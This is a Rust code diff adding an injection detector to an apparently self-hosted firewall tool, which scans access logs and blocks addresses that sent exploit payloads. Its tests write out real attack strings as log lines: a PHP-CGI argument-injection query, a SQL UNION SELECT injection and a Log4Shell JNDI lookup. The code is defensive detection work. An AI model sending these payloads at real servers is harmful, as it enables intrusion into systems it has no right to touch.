@@ -41,6 +41,7 @@ pub enum ScanKind {
     Scanning,
     SpoofedCrawler,
     ProbePath,
+    Injection,
     Honeypot,
     /// The three behavioural detectors share a noun: each finds a client
     /// that doesn't act like a browser, by a different tell.
@@ -56,6 +57,7 @@ impl ScanKind {
             ScanKind::Scanning => "scanning IP",
             ScanKind::SpoofedCrawler => "forged crawler IP",
             ScanKind::ProbePath => "probing IP",
+            ScanKind::Injection => "injecting IP",
             ScanKind::Honeypot => "trapped IP",
             ScanKind::NonBrowser => "non-browser IP",
             ScanKind::RobotsTxt => "robots.txt fetcher",
@@ -178,6 +180,7 @@ pub fn run_detector(
         D::WebScanners => block_web_scanners(db, DEFAULT_WEB_PATHS, ttl_days, log_text, dry_run),
         D::SpoofedCrawlers => block_spoofed_crawlers(db, ttl_days, log_text, dry_run),
         D::ProbePaths => block_probe_paths(db, ttl_days, log_text, dry_run),
+        D::Injection => block_injection(db, ttl_days, log_text, dry_run),
         D::Honeypot => block_honeypot(db, ttl_days, log_text, dry_run),
         D::AssetRatio => block_asset_ratio(db, ttl_days, log_text, dry_run),
         D::RotatingUserAgent => block_rotating_ua(db, ttl_days, log_text, dry_run),
@@ -390,6 +393,32 @@ pub fn block_probe_paths(
     add_block_rules(
         db,
         ScanKind::ProbePath,
+        found,
+        candidates,
+        0,
+        true,
+        ttl_days,
+        dry_run,
+    )
+}
+
+/// Finds addresses in `log_text` that sent an exploit payload (see
+/// [`accesslog::injection_ips`]) and adds a Block rule expiring after
+/// `ttl_days` for each — through the same exemptions as every detector
+/// here, so an address that logged in over SSH, a trusted one, or one
+/// inside a verified crawler's range is never blocked by it.
+pub fn block_injection(
+    db: &Db,
+    ttl_days: i64,
+    log_text: &str,
+    dry_run: bool,
+) -> Result<ScanBlockOutcome> {
+    let hits = accesslog::injection_ips(log_text);
+    let found = hits.len();
+    let candidates: Vec<String> = hits.into_iter().map(|(ip, _kind)| ip).collect();
+    add_block_rules(
+        db,
+        ScanKind::Injection,
         found,
         candidates,
         0,
@@ -1089,6 +1118,82 @@ mod tests {
         format!(
             "{ip} - - [10/Jul/2026:12:00:00 +0000] \"GET {path} HTTP/1.1\" 404 0 \"-\" \"curl/8\"\n"
         )
+    }
+
+    // ---- injection blocking ----
+
+    fn request_line(ip: &str, request: &str, user_agent: &str) -> String {
+        format!(
+            "{ip} - - [10/Jul/2026:12:00:00 +0000] \"{request}\" 400 0 \"-\" \"{user_agent}\"\n"
+        )
+    }
+
+    #[test]
+    fn block_injection_blocks_a_single_payload() {
+        let db = Db::open_in_memory().unwrap();
+        let log = request_line(
+            "203.0.113.9",
+            "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1",
+            "Mozilla/5.0",
+        );
+
+        let outcome = block_injection(&db, 7, &log, false).unwrap();
+
+        assert_eq!(outcome.kind, ScanKind::Injection);
+        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
+        assert!(db.list_firewall_rules().unwrap()[0].expires_at.is_some());
+    }
+
+    #[test]
+    fn block_injection_ignores_ordinary_traffic_and_searches() {
+        let db = Db::open_in_memory().unwrap();
+        let log = [
+            request_line("203.0.113.9", "GET /blog/ HTTP/2.0", "Mozilla/5.0"),
+            request_line(
+                "203.0.113.10",
+                "GET /?s=%2Fetc%2Fpasswd HTTP/2.0",
+                "Mozilla/5.0",
+            ),
+        ]
+        .concat();
+
+        assert_eq!(block_injection(&db, 7, &log, false).unwrap().candidates, 0);
+        assert!(db.list_firewall_rules().unwrap().is_empty());
+    }
+
+    /// The payload is in the query, which the path every other detector
+    /// reads has already lost — and here the target was logged with its
+    /// spaces, so it is not the second word of the request line either.
+    #[test]
+    fn block_injection_reads_the_query_and_a_target_with_spaces() {
+        let db = Db::open_in_memory().unwrap();
+        let log = request_line(
+            "203.0.113.9",
+            "GET /?id=-1 UNION SELECT 1,2,3-- HTTP/1.1",
+            "Mozilla/5.0",
+        );
+
+        assert_eq!(block_injection(&db, 7, &log, true).unwrap().candidates, 1);
+    }
+
+    /// The same exemptions as every other detector: the operator's own
+    /// address is never written as a Block, whatever it sent.
+    #[test]
+    fn block_injection_leaves_an_address_with_a_recent_ssh_login_alone() {
+        let db = Db::open_in_memory().unwrap();
+        db.record_ssh_login_ips(&["198.51.100.9".to_string()])
+            .unwrap();
+        let log = request_line(
+            "198.51.100.9",
+            "GET /?x=${jndi:ldap://a/b} HTTP/1.1",
+            "curl/8",
+        );
+
+        let outcome = block_injection(&db, 7, &log, false).unwrap();
+
+        assert!(outcome.newly_blocked.is_empty());
+        assert_eq!(outcome.skipped_ssh_logins, 1);
+        assert!(db.list_firewall_rules().unwrap().is_empty());
     }
 
     #[test]
